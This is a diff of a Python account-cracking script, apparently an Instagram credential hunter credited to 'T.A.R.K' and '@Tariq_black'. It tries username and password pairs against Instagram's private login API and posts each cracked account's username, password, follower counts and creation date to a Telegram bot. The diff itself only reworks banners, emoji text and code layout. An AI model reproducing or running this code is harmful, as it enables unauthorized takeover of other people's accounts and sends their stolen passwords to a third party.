@@ -1,4 +1,4 @@
-0772 208 0690import os
+import os
 os.system('clear')
 try:
     from time import sleep
@@ -57,7 +57,7 @@ else:
             sleep(0.026)
 
 
-    a(f"                      {Y}***مطور الاداة قيس التكريتي******* **بسم الله الرحمن الرحيم **** ")
+    a(f"                      {Y}***مطور الاداة قيس التكريتي******* ******بسم الله الرحمن الرحيم ******** ")
 
 
 
@@ -103,11 +103,13 @@ else:
         dat = ree['data']
         t = time.localtime()
         current_time = time.strftime('%H:%M:%S', t)
-        joo3 = f"\n⭐️✅تعال حبيصي جبتلك حساب  ✅⭐️\n\n✔️⭐️   ⭐️✔️\n .<•> –––––––––––––––– <•>. \n .♻️. Name ➡️  : {name}\n .🔱. Use®Name☣️ : {userQ}\n .🔆. BaSsWord↪️  : {password}\n .♾. 𝕱ollowes✴️ : {followes}\n .💠. 𝕱𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : {following}\n .➡️. 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕺𝖆𝖙𝖊 : {dat}\n .⚠️. TIⓂ️E : {current_time}\n .⛔️. 𝙩𝙝𝙞𝙨 𝙄𝙨 𝙏𝙝𝙚 𝙃𝙪𝙣𝙩 𝙉𝙪𝙢𝙗𝙚𝙧 [{zz}] ✅🤤\n .<•> –––––––––––––––– <•>.\n.🔰. 𝐂𝐡 :@Tariq_black ♦️\n"
+        joo3 = f"\n⭐✅تعال حبيصي جبتلك حساب  ✅⭐\n\n✔️⭐   ⭐✔️\n ︎.<•>︎ ––––––––––––––––︎ <•>. \n .♻. Name ➡  : {name}\n .🔱. Use®Name☣ : {userQ}\n .🔆. BaSsWord↪  : {password}\n .♾. 𝕱ollowes✴ : {followes}\n .💠. 𝕱𝖔𝖑𝖑𝖔𝖜𝖎𝖓𝖌 : {following}\n .➡. 𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕺𝖆𝖙𝖊 : {dat}\n .⚠. TIⓂE : {current_time}\n .⛔. 𝙩𝙝𝙞𝙨 𝙄𝙨 𝙏𝙝𝙚 𝙃𝙪𝙣𝙩 𝙉𝙪𝙢𝙗𝙚𝙧 [{zz}] ✅🤤\n ︎.<•>︎ ––––––––––––––––︎ <•>.\n.🔰. 𝐂𝐡 :@Tariq_black ♦\n"
         tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
         i = requests.post(tlg)
         print(G + joo3)
-        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
+
+
+    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
     headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
     
     
@@ -140,6 +142,6 @@ else:
         elif '"message":"challenge_required","challenge"' in req.json():
             print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
         else:
-            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= T.A.R.K IS ALDYLIMY \n\nTh THIS TOOL BY T.A.R.K ⭐️\n->•My Channel 👇✔️\n√| @Tariq_black |√\n->• My Id 👇✔️\n√|M.S.A|√\n\n->• Hunted✔️ [{zz}]\n->•🇳\u200aNot hunted❌ [{aa}]")
+            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= T.A.R.K IS ALDYLIMY \n\nTh THIS TOOL BY T.A.R.K ⭐\n->•My Channel 👇✔️\n√| @Tariq_black |√\n->• My Id 👇✔️\n√|M.S.A|√\n\n->• Hunted✔️ [{zz}]\n->•🇳\u200aNot hunted❌ [{aa}]")
             print(E + 'username ==> : ' + username + ': password ==> : ' + password)
             aa += 1
